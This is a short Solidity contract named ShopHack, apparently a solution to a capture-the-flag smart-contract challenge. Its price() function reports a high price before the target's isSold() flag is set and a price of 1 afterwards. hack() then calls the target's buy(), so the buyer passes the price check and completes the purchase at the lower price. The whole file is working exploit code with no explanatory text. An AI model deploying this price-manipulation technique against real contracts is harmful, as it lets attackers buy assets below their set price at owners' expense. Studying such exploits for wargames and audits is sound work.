// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ShopHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function price() external view returns (uint _price) {
        (, bytes memory returnData) = target.staticcall(abi.encodeWithSignature("isSold()"));
        bool isSold = abi.decode(returnData, (bool));
        _price = isSold ? 1 : 100;
    }

    function hack() external {
        target.call(abi.encodeWithSignature("buy()"));
    }
}
